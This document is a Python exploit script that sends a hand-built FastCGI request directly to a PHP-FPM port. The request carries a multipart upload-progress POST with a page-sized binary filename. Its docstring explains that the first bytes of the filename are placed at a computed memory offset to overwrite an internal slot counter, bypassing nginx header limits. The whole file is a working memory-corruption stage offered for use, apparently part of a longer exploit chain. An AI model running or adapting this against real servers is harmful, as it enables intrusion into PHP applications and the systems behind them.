#!/usr/bin/env python3
"""Direct FastCGI upload-progress request with a long binary filename.

The filename raw buffer (getword_conf) is live at FILE_START, when the session
decode runs. A 4-10 page filename can land at main+0x84000 and its first bytes
become dt's used_slots. Bypasses nginx header size limits.

Usage: fcgi_raw.py <port> <sid> <used_slots> <filename_pages>
"""
import socket
import struct
import sys

port = int(sys.argv[1])
sid = sys.argv[2]
used = int(sys.argv[3])
pages = int(sys.argv[4])

fcgi_len = pages * 4096 - 96
fn = used.to_bytes(8, "little", signed=True) + b"F" * (fcgi_len - 8)
boundary = b"----raw"
body = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="' + fn + b'"\r\n'
    b"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
    b"--" + boundary + b"--\r\n"
)

params = {
    b"SCRIPT_FILENAME": b"/var/www/html/index.php",
    b"REQUEST_METHOD": b"POST",
    b"CONTENT_TYPE": b"multipart/form-data; boundary=" + boundary,
    b"CONTENT_LENGTH": str(len(body)).encode(),
    b"HTTP_COOKIE": b"PHPSESSID=" + sid.encode(),
    b"SERVER_PROTOCOL": b"HTTP/1.1",
    b"REQUEST_URI": b"/index.php",
    b"DOCUMENT_ROOT": b"/var/www/html",
    b"GATEWAY_INTERFACE": b"CGI/1.1",
    b"SERVER_SOFTWARE": b"p2s",
    b"REMOTE_ADDR": b"127.0.0.1",
    b"SERVER_PORT": b"9000",
    b"SERVER_NAME": b"localhost",
}

def nv(name, value):
    def l(x):
        return bytes([x]) if x < 128 else (x | 0x80000000).to_bytes(4, "big")
    return l(len(name)) + l(len(value)) + name + value

def rec(t, rid, data):
    pad = (8 - len(data) % 8) % 8
    return struct.pack("!BBHHBB", 1, t, rid, len(data), pad, 0) + data + b"\0" * pad

rid = 1
out = rec(1, rid, struct.pack("!HBxxxxx", 1, 0))
out += rec(4, rid, b"".join(nv(k, v) for k, v in params.items()))
out += rec(4, rid, b"")
out += rec(5, rid, body)
out += rec(5, rid, b"")

s = socket.create_connection(("127.0.0.1", port), timeout=30)
s.sendall(out)
resp = b""
try:
    while True:
        h = s.recv(8)
        if len(h) < 8:
            break
        _, t, _, clen, plen, _ = struct.unpack("!BBHHBB", h)
        data = b""
        while len(data) < clen:
            chunk = s.recv(clen - len(data))
            if not chunk:
                break
            data += chunk
        s.recv(plen)
        if t == 6:
            resp += data
        if t == 3:
            break
except socket.timeout:
    pass
s.close()
head, _, payload = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1"))
print("resp_body=%d" % len(payload))
